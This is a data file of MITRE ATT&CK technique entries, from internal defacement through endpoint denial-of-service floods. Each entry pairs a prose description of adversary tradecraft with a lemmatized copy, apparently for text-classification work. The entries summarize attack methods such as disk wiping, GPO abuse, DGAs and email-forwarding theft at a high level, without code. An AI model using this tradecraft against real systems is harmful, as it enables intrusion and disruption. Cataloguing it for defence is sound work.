T1491.001,Defacement: Internal Defacement,"An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users, thus discrediting the integrity of the systems. This may take the form of modifications to internal websites, or directly to user systems with the replacement of the desktop wallpaper.",adversary deface system internal organization attempt intimidate mislead user discredit integrity system form modification internal website directly user system replacement desktop wallpaper
T1491.002,Defacement: External Defacement,"An adversary may deface systems external to an organization in an attempt to deliver messaging, intimidate, or otherwise mislead an organization or users. External Defacement may ultimately cause users to distrust the systems and to question/discredit the system’s integrity. Externally-facing websites are a common victim of defacement; often targeted by adversary and hacktivist groups in order to push a political message or spread propaganda.",adversary deface system external organization attempt deliver messaging intimidate mislead organization user external defacement ultimately cause user distrust system question discredit system integrity externally face website common victim defacement target adversary hacktivist group order push political message spread propaganda
T1140,Deobfuscate/Decode Files or Information,Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.One such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file.Sometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.,adversary use obfuscated files information hide artifact intrusion analysis require separate mechanism decode deobfuscate information depend intend use method include build functionality malware utility present system example use certutil decode remote access tool portable executable file hide inside certificate file user action require open deobfuscation decryption user execution user require input password open password protect compress encrypt file provide adversary
T1610,Deploy Container,"Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment.Containers can be deployed by various means, such as via Docker's create and start APIs or via a web application such as the Kubernetes dashboard or Kubeflow.",adversary deploy container environment facilitate execution evade defense case adversary deploy new container execute process associate particular image deployment process execute download malware adversary deploy new container configure network rule user limitation etc bypass existing defense environment container deploy mean docker create start api web application kubernetes dashboard kubeflow
T1587,Develop Capabilities,"Adversaries may build capabilities that can be used during targeting. Rather than purchasing, freely downloading, or stealing capabilities, adversaries may develop their own capabilities in-house. This is the process of identifying development requirements and building solutions such as malware, exploits, and self-signed certificates. Adversaries may develop capabilities to support their operations throughout numerous phases of the adversary lifecycle.As with legitimate development efforts, different skill sets may be required for developing capabilities. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the capability.",adversary build capability targeting purchase freely download steal capability adversary develop capability house process identify development requirement build solution malware exploit self sign certificate adversary develop capability support operation numerous phase adversary lifecycle legitimate development effort different skill set require develop capability skill need locate house need contract use contractor consider extension adversary development capability provide adversary play role shape requirement maintain degree exclusivity capability
T1587.001,Develop Capabilities: Malware,"Adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.As with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware.Some aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of Web Services.",adversary develop malware malware component targeting build malicious software include development payload dropper post compromise tool backdoor include backdoored image packer protocol creation infected removable medium adversary develop malware support operation create means maintain control remote machine evade defense execute post compromise behavior legitimate development effort different skill set require develop malware skill need locate house need contract use contractor consider extension adversary malware development capability provide adversary play role shape requirement maintain degree exclusivity malware aspect malware development protocol development require adversary obtain additional infrastructure example malware develop communicate twitter require use web services
T1587.002,Develop Capabilities: Code Signing Certificates,"Adversaries may create self-signed code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with. Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.Prior to Code Signing, adversaries may develop self-signed code signing certificates for use in operations.",adversary create self sign code signing certificate targeting code signing process digitally sign executable script confirm software author guarantee code alter corrupt code signing provide level authenticity program developer guarantee program tamper user security tool trust sign piece code unsigned piece code know issue certificate author prior code signing adversary develop self sign code signing certificate use operation
T1587.003,Develop Capabilities: Digital Certificates,"Adversaries may create self-signed SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. In the case of self-signing, digital certificates will lack the element of trust associated with the signature of a third-party certificate authority (CA).Adversaries may create self-signed SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: Asymmetric Cryptography with Web Protocols) or even enabling Adversary-in-the-Middle if added to the root of trust (i.e. Install Root Certificate).After creating a digital certificate, an adversary may then install that certificate (see Install Digital Certificate) on infrastructure under their control.",adversary create self sign ssl tls certificate targeting ssl tls certificate design instill trust include information key information owner identity digital signature entity verify certificate content correct signature valid person examine certificate trust signer know use key communicate owner case self signing digital certificate lack element trust associate signature party certificate authority create self sign ssl tls certificate operation encrypt traffic ex asymmetric cryptography web protocols enable adversary middle add root trust install root create digital certificate adversary install certificate install digital certificate infrastructure control
T1587.004,Develop Capabilities: Exploits,"Adversaries may develop exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than finding/modifying exploits from online or purchasing them from exploit vendors, an adversary may develop their own exploits.As with legitimate development efforts, different skill sets may be required for developing exploits. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's exploit development capabilities, provided the adversary plays a role in shaping requirements and maintains an initial degree of exclusivity to the exploit.Adversaries may use exploits during various phases of the adversary lifecycle (i.e. Exploit Public-Facing Application, Exploitation for Client Execution, Exploitation for Privilege Escalation, Exploitation for Defense Evasion, Exploitation for Credential Access, Exploitation of Remote Services, and Application or System Exploitation).",adversary develop exploit targeting exploit take advantage bug vulnerability order cause unintended unanticipated behavior occur computer hardware software find modify exploit online purchase exploit vendor adversary develop exploit legitimate development effort different skill set require develop exploit skill need locate house need contract use contractor consider extension adversary exploit development capability provide adversary play role shape requirement maintain initial degree exclusivity exploit adversary use exploit phase adversary lifecycle exploit public facing application exploitation client execution exploitation privilege escalation exploitation defense evasion exploitation credential access exploitation remote service application system exploitation
T1652,Device Driver Discovery,"Adversaries may attempt to enumerate local device drivers on a victim host. Information about device drivers may highlight various insights that shape follow-on behaviors, such as the function/purpose of the host, present security tools (i.e. Security Software Discovery) or other defenses (e.g., Virtualization/Sandbox Evasion), as well as potential exploitable vulnerabilities (e.g., Exploitation for Privilege Escalation).Many OS utilities may provide information about local device drivers, such as driverquery.exe and the EnumDeviceDrivers() API function on Windows.On Linux/macOS, device drivers (in the form of kernel modules) may be visible within /dev or using utilities such as lsmod and modinfo.",adversary attempt enumerate local device driver victim host information device driver highlight insight shape follow behavior function purpose host present security tool security software discovery defense virtualization sandbox evasion potential exploitable vulnerability exploitation privilege os utility provide information local device driver enumdevicedrivers api function windows linux macos device driver form kernel module visible utility lsmod modinfo
T1006,Direct Volume Access,"Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique bypasses Windows file access controls as well as file system monitoring tools. Utilities, such as NinjaCopy, exist to perform these actions in PowerShell.",adversary directly access volume bypass file access control file system monitoring windows allow program direct access logical volume program direct access read write file directly drive analyze file system data structure technique bypass windows file access control file system monitoring tool utility ninjacopy exist perform action powershell
T1561,Disk Wipe,"Adversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources. With direct write access to a disk, adversaries may attempt to overwrite portions of disk data. Adversaries may opt to wipe arbitrary portions of disk data and/or wipe disk structures like the master boot record (MBR). A complete wipe of all disk sectors may be attempted.To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disks may have worm-like features to propagate across a network by leveraging additional techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares.On network devices, adversaries may wipe configuration files and other data from the device using Network Device CLI commands such as erase.",adversary wipe corrupt raw disk datum specific system large number network interrupt availability system network resource direct write access disk adversary attempt overwrite portion disk datum adversary opt wipe arbitrary portion disk datum wipe disk structure like master boot record mbr complete wipe disk sector attempt maximize impact target organization operation network wide availability interruption goal malware wipe disk worm like feature propagate network leverage additional technique like valid accounts os credential dumping smb windows admin shares network device adversary wipe configuration file datum device network device cli command erase
T1561.001,Disk Wipe: Disk Content Wipe,"Adversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources.Adversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface. This behavior is distinct from Data Destruction because sections of the disk are erased instead of individual files.To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares.",adversary erase content storage device specific system large number network interrupt availability system network resource adversary partially completely overwrite content storage device render data irrecoverable storage interface behavior distinct data destruction section disk erase instead individual file maximize impact target organization operation network wide availability interruption goal malware wipe disk content worm like feature propagate network leverage additional technique like valid accounts os credential dumping smb windows admin shares
T1561.002,Disk Wipe: Disk Structure Wipe,"Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. Adversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table. The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. Disk Structure Wipe may be performed in isolation, or along with Disk Content Wipe if all sectors of a disk are wiped.On a network devices, adversaries may reformat the file system using Network Device CLI commands such as format.To maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares.",adversary corrupt wipe disk datum structure hard drive necessary boot system target specific critical system large number network interrupt availability system network resource adversary attempt render system unable boot overwrite critical datum locate structure master boot record mbr partition table datum contain disk structure include initial executable code load operate system location file system partition disk information present computer able load operate system boot process leave computer unavailable disk structure wipe perform isolation disk content wipe sector disk wipe network device adversary reformat file system network device cli command format maximize impact target organization malware design destroy disk structure worm like feature propagate network leverage technique like valid accounts os credential dumping smb windows admin share
T1484,Domain Policy Modification,"Adversaries may modify the configuration settings of a domain to evade defenses and/or escalate privileges in domain environments. Domains provide a centralized means of managing how computer resources (ex: computers, user accounts) can act, and interact with each other, on a network. The policy of the domain also includes configuration settings that may apply between domains in a multi-domain/forest environment. Modifications to domain settings may include altering domain Group Policy Objects (GPOs) or changing trust settings for domains, including federation trusts.With sufficient permissions, adversaries can modify domain policy settings. Since domain configuration settings control many of the interactions within the Active Directory (AD) environment, there are a great number of potential attacks that can stem from this abuse. Examples of such abuse include modifying GPOs to push a malicious Scheduled Task to computers throughout the domain environment Adversaries can also change configuration settings within the AD environment to implement a Rogue Domain Controller.Adversaries may temporarily modify domain policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators.",adversary modify configuration setting domain evade defense escalate privilege domain environment domain provide centralized means manage computer resource ex computer user account act interact network policy domain include configuration setting apply domain multi domain forest environment modification domain setting include alter domain group policy objects gpos change trust setting domain include federation trust sufficient permission adversary modify domain policy setting domain configuration setting control interaction active directory ad environment great number potential attack stem abuse example abuse include modify gpo push malicious schedule task computer domain environment adversary change configuration setting ad environment implement rogue domain controller adversary temporarily modify domain policy carry malicious revert change remove suspicious indicator
T1484.001,Domain Policy Modification: Group Policy Modification,"Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predictable network path \<DOMAIN>\SYSVOL\<DOMAIN>\Policies\. Like other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.Malicious GPO modifications can be used to implement many other malicious behaviors such as Scheduled Task/Job, Disable or Modify Tools, Ingress Tool Transfer, Create Account, Service Execution, and more.For example, publicly available scripts such as New-GPOImmediateTask can be leveraged to automate the creation of a malicious Scheduled Task/Job by modifying GPO settings, in this case modifying <GPO_PATH>\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml.",adversary modify group policy objects gpos subvert intend discretionary access control domain usually intention escalate privilege domain group policy allow centralized management user computer setting active directory ad gpos container group policy setting file store predictable network path like object ad gpos access control associate default user account domain permission read gpos possible delegate gpo access control permission write access specific user group domain malicious gpo modification implement malicious behavior scheduled task job disable modify tool ingress tool transfer create account service execution example publicly available script new gpoimmediatetask leverage automate creation malicious scheduled task job modify gpo setting case modify
T1484.002,Domain Policy Modification: Domain Trust Modification,"Adversaries may add new domain trusts or modify the properties of existing domain trusts to evade defenses and/or elevate privileges. Domain trust details, such as whether or not a domain is federated, allow authentication and authorization properties to apply between domains for the purpose of accessing shared resources. These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.Manipulating the domain trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, this may be used to forge SAML Tokens, without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate. An adversary may also convert a domain to a federated domain, which may enable malicious trust modifications such as altering the claim issuance rules to log in any valid set of credentials as a specified user.",adversary add new domain trust modify property exist domain trust evade defense elevate privilege domain trust detail domain federate allow authentication authorization property apply domain purpose access share resource trust object include account credential authentication material apply server token domain manipulate domain trust allow adversary escalate privilege evade defense modify setting add object control example forge saml tokens need compromise signing certificate forge new credential instead adversary manipulate domain trust add signing certificate adversary convert domain federated domain enable malicious trust modification alter claim issuance rule log valid set credential specify user
T1482,Domain Trust Discovery,Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.,adversary attempt gather information domain trust relationship identify lateral movement opportunity windows multi domain forest environment domain trust provide mechanism domain allow access resource base authentication procedure domain
T1189,Drive-by Compromise,"Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring Application Access Token.Multiple ways of delivering exploit code to a browser exist (i.e., Drive-by Target), including:A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting Script files served to a legitimate website from a publicly writeable cloud storage bucket are modified by an adversary Malicious ads are paid for and served through legitimate ad providers (i.e., Malvertising) Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).Often the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.Typical drive-by compromise process:A user visits a website that is used to host the adversary controlled content.Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.Upon finding a vulnerable version, exploit code is delivered to the browser.If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.In some cases a second visit to the website after the initial scan is required before exploit code is delivered.Unlike Exploit Public-Facing Application, the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.Adversaries may also use compromised websites to deliver a user to a malicious application designed to Steal Application Access Tokens, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.",adversary gain access system user visit website normal course browsing technique user web browser typically target exploitation adversary use compromise website non exploitation behavior acquire application access token multiple way deliver exploit code browser exist drive target include legitimate website compromise adversary inject form malicious code javascript iframes cross site scripting script file serve legitimate website publicly writeable cloud storage bucket modify adversary malicious ad pay serve legitimate ad provider malvertising build web application interface leveraged insertion kind object display web content contain script execute visit client forum post comment user controllable web website adversary visit specific community government particular industry region goal compromise specific user set user base share interest kind target campaign refer strategic web compromise watering hole attack know example occur typical drive compromise process user visit website host adversary control content script automatically execute typically search version browser plugin potentially vulnerable version user require assist process enable scripting active website component ignore warning dialog box find vulnerable version exploit code deliver browser exploitation successful adversary code execution user system protection place case second visit website initial scan require exploit code deliver unlike exploit public facing application focus technique exploit software client endpoint visit website commonly adversary access system internal network instead external system use compromise website deliver user malicious application design steal application access token like oauth token gain access protect application information malicious application deliver popup legitimate website
T1568,Dynamic Resolution,"Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.Adversaries may use dynamic resolution for the purpose of Fallback Channels. When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.",adversary dynamically establish connection command control infrastructure evade common detection remediation achieve malware share common algorithm infrastructure adversary use receive malware communication calculation dynamically adjust parameter domain ip address port number malware use command control adversary use dynamic resolution purpose fallback channels contact lose primary command control server malware employ dynamic resolution means reestablish command control
T1568.001,Dynamic Resolution: Fast Flux DNS,"Adversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution. This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record.The simplest, ""single-flux"" method, involves registering and de-registering an addresses as part of the DNS A (address) record list for a single DNS name. These registrations have a five-minute average lifespan, resulting in a constant shuffle of IP address resolution.In contrast, the ""double-flux"" method registers and de-registers an address as part of the DNS Name Server record list for the DNS zone, providing additional resilience for the connection. With double-flux additional hosts can act as a proxy to the C2 host, further insulating the true source of the C2 channel.",adversary use fast flux dns hide command control channel array rapidly change ip address link single domain resolution technique use fully qualified domain multiple ip address assign swap high frequency combination round robin ip addressing short time live ttl dns resource record simple single flux method involve register de register address dns address record list single dns registration minute average lifespan result constant shuffle ip address resolution contrast double flux method register de register address dns server record list dns zone provide additional resilience connection double flux additional host act proxy host insulate true source channel
T1568.002,Dynamic Resolution: Domain Generation Algorithms,"Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.DGAs can take the form of apparently random or ""gibberish"" strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.Adversaries may use DGAs for the purpose of Fallback Channels. When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.",adversary use domain generation algorithms dgas dynamically identify destination domain command control traffic rely list static ip address domain advantage make hard defender block track command control channel potentially thousand domain malware check instruction dgas form apparently random gibberish string ex construct domain name generate letter alternatively dgas employ word unit concatenate word instead letter ex dgas time base generate different domain time period hourly daily monthly etc incorporate seed value predict future domain difficult defender adversary use dgas purpose fallback channels contact lose primary command control server malware employ dga means reestablish command control
T1568.003,Dynamic Resolution: DNS Calculation,"Adversaries may perform calculations on addresses returned in DNS results to determine which port and IP address to use for command and control, rather than relying on a predetermined port number or the actual returned IP address. A IP and/or port number calculation can be used to bypass egress filtering on a C2 channel.One implementation of DNS Calculation is to take the first three octets of an IP address in a DNS response and use those values to calculate the port for command and control traffic.",adversary perform calculation address return dns result determine port ip address use command control rely predetermine port number actual return ip address ip port number calculation bypass egress filtering channel implementation dns calculation octet ip address dns response use value calculate port command control traffic
T1114,Email Collection,"Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Adversaries can collect or forward email from mail servers or clients.",adversary target user email collect sensitive information email contain sensitive datum include trade secret personal information prove valuable adversary adversary collect forward email mail server client
T1114.001,Email Collection: Local Email Collection,"Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user’s local system, such as Outlook storage or cache files.Outlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB.",adversary target user email local system collect sensitive information file contain email datum acquire user local system outlook storage cache file outlook store datum locally offline data file extension outlook later support file size gb early version outlook support gb
T1114.002,Email Collection: Remote Email Collection,"Adversaries may target an Exchange server, Office 365, or Google Workspace to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services, Office 365, or Google Workspace to access email using credentials or access tokens. Tools such as MailSniper can be used to automate searches for specific keywords.",adversary target exchange server office google workspace collect sensitive information adversary leverage user credential interact directly exchange server acquire information network adversary access externally face exchange service office google workspace access email credential access token tool mailsniper automate search specific keyword
T1114.003,Email Collection: Email Forwarding Rule,"Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim’s organization to use as part of further exploits or operations.Any user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more. Adversaries may also hide the rule by making use of the Microsoft Messaging API (MAPI) to modify the rule properties, making it hidden and not visible from Outlook, OWA or most Exchange Administration tools.In some environments, administrators may be able to enable email forwarding rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions. Adversaries that abuse such features may be able to enable forwarding on all or specific mail an organization receives.",adversary setup email forwarding rule collect sensitive information adversary abuse email forwarding rule monitor activity victim steal information gain intelligence victim victim organization use exploit operation user administrator organization adversary valid credential create rule automatically forward receive message recipient forward email different location base sender adversary hide rule make use microsoft messaging api mapi modify rule property make hidden visible outlook owa exchange administration tool environment administrator able enable email forwarding rule operate organization wide individual inboxe example microsoft exchange support transport rule evaluate mail organization receive user specify condition perform user specify action mail adhere condition adversary abuse feature able enable forwarding specific mail organization receive
T1573,Encrypted Channel,"Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.",adversary employ know encryption algorithm conceal command control traffic rely inherent protection provide communication protocol despite use secure algorithm implementation vulnerable reverse engineering secret key encode generate malware sample configuration file
T1573.001,Encrypted Channel: Symmetric Cryptography,"Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",adversary employ know symmetric encryption algorithm conceal command control traffic rely inherent protection provide communication protocol symmetric encryption algorithm use key plaintext encryption ciphertext decryption common symmetric encryption algorithm include aes des blowfish
T1573.002,Encrypted Channel: Asymmetric Cryptography,"Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver’s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.For efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as Asymmetric Cryptography.",adversary employ know asymmetric encryption algorithm conceal command control traffic rely inherent protection provide communication protocol asymmetric cryptography know public key cryptography use keypair party public freely distribute private key generate sender encrypt datum receiver public key receiver decrypt datum private key ensure intend recipient read encrypt datum common public key encryption algorithm include rsa elgamal efficiency protocol include ssl tls use symmetric cryptography connection establish use asymmetric cryptography establish transmit key protocol classify asymmetric cryptography
T1499,Endpoint Denial of Service,"Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposesAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).To perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.Botnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.In cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.For attacks attempting to saturate the providing network, see Network Denial of Service.",adversary perform endpoint denial service dos attack degrade block availability service user endpoint dos perform exhaust system resource service host exploit system cause persistent crash condition example service include website email service dns web base application adversary observe conduct dos attack political purposesan endpoint dos deny availability service saturate network provide access service adversary target layer application stack host system provide service layer include operating systems os server application web server dns server database typically web base application sit attack layer require different technique advantage bottleneck unique respective component dos attack generate single system multiple system spread internet commonly refer distribute dos perform dos attack endpoint resource aspect apply multiple method include ip address spoofing botnet adversary use original ip address attack system spoof source ip address attack traffic difficult trace attack system enable reflection increase difficulty defender defend attack reduce eliminate effectiveness filter source address network defense device botnet commonly conduct ddos attack network service large botnet generate significant traffic system spread global internet adversary resource build control botnet infrastructure rent time exist botnet conduct attack bad case ddos system generate request need send small traffic produce volume exhaust target resource circumstance distinguish ddos traffic legitimate client exceedingly difficult botnet high profile ddos attack series incident target major bank case traffic manipulation point global network high traffic gateway router packet alter cause legitimate client execute code direct network packet target high volume type capability previously purpose web censorship client http traffic modify include reference javascript generate ddos code overwhelm target web server attack attempt saturate provide network network denial service
T1499.001,Endpoint Denial of Service: OS Exhaustion Flood,"Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.Different ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.ACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.",adversary launch denial service dos attack target endpoint operating system os system os responsible manage finite resource prevent entire system overwhelm excessive demand capacity attack need exhaust actual resource system attack simply exhaust limit available resource os self impose different way achieve exist include tcp state exhaustion attack syn flood ack flood ack flood leverage stateful nature tcp protocol flood ack packet send target force os search state table related tcp connection establish ack packet connection exist os search entire state table confirm match exist necessary large flood packet computational requirement cause server sluggish unresponsive work eliminate rogue ack packet greatly reduce resource available provide target service
T1499.002,Endpoint Denial of Service: Service Exhaustion Flood,"Adversaries may target the different network services provided by systems to conduct a denial of service (DoS). Adversaries often target the availability of DNS and web services, however others have been targeted as well. Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service.One example of this type of attack is known as a simple HTTP flood, where an adversary sends a large number of HTTP requests to a web server to overwhelm it and/or an application that runs on top of it. This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service.Another variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.",adversary target different network service provide system conduct denial service dos adversary target availability dns web service target web server software attack variety mean apply generally specific software provide service example type attack know simple http flood adversary send large number http request web server overwhelm application run flood rely raw volume accomplish objective exhaust resource require victim software provide service variation know ssl renegotiation attack take advantage protocol feature ssl tls ssl tls protocol suite include mechanism client server agree encryption algorithm use subsequent secure connection ssl renegotiation enable request renegotiation crypto algorithm renegotiation attack adversary establish ssl tls connection proceed series 